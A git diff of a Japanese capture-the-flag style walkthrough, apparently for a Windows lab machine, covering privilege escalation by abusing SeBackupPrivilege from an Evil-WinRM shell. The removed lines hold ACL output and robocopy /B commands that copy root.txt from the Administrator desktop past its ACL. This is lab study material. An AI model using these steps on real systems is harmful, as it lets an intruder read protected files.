@@ -140,6 +140,9 @@ Info: Establishing connection to remote endpoint
 
 
 ## STEP 3
+`SeBackupPrivilege`が有効になっているので、こいつを悪用できそう  
+SeBackupPrivilegeは[リンク](https://learn.microsoft.com/ja-jp/windows-hardware/drivers/ifs/privileges)で確認できる通り、オブジェクトのACLをバイパスしてアクセスが可能  
+ただ[リンク](https://serverfault.com/questions/980880/sebackupprivilege-but-cannot-read-all-files)でもある通り、この権限は専用のAPIを使用したプログラムでないと適用されない
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /all
 
@@ -193,48 +196,9 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
-```powershell
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> get-acl C:\Users\svc-printer\Desktop\user.txt | Format-Table -AutoSize -Wrap
 
 
-    Directory: C:\Users\svc-printer\Desktop
-
-
-Path     Owner              Access
-----     -----              ------
-user.txt RETURN\svc-printer RETURN\Administrator Allow  FullControl
-                            NT AUTHORITY\SYSTEM Allow  FullControl
-                            BUILTIN\Administrators Allow  FullControl
-                            RETURN\svc-printer Allow  FullControl
-
-
-*Evil-WinRM* PS C:\Users\svc-printer\Documents> get-acl C:\Users\administrator\Desktop\root.txt | Format-Table -AutoSize -Wrap
-
-
-    Directory: C:\Users\administrator\Desktop
-
-
-Path     Owner                  Access
-----     -----                  ------
-root.txt BUILTIN\Administrators RETURN\Administrator Allow  FullControl
-                                NT AUTHORITY\SYSTEM Allow  FullControl
-                                BUILTIN\Administrators Allow  FullControl
-                                RETURN\Administrator Allow  FullControl
-```
-短く結論：SeBackupPrivilege が有効でも、通常のファイル読み取り（type, Get-Content 等）はNTFS ACL に従うため拒否されます。SeBackupPrivilege を使ってファイルを取り出すには バックアップ用 API / バックアップモードを使うツール を使う必要があります。代表的で手っ取り早い方法は robocopy の /B オプション（backup mode）です。以下に理由と実例コマンド、代替手段を説明します。
-
-mkdir C:\temp\exfil
-robocopy "C:\Users\administrator\Desktop" "C:\temp\exfil" "root.txt" /B /NFL /NDL /NJH /NJS
-type C:\temp\exfil\root.txt
-説明：
-
-/B = backup mode（SeBackupPrivilege を用いて ACL を回避してコピー）
-
-/NFL /NDL /NJH /NJS は不要な出力を抑えるオプション（任意）
-
-成功すれば C:\temp\exfil\root.txt にファイルが作られ、中身を type や Get-Content で読めます。
-
-もし Access denied や ERROR 5 が出たら、robocopy がバックアップ特権を実際に使えていない可能性があります（例：あなたのシェルプロセスに特権が有効でも子プロセスで無効になっている等）。
+### PATH 3-1
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> mkdir C:\temp\exfil
 
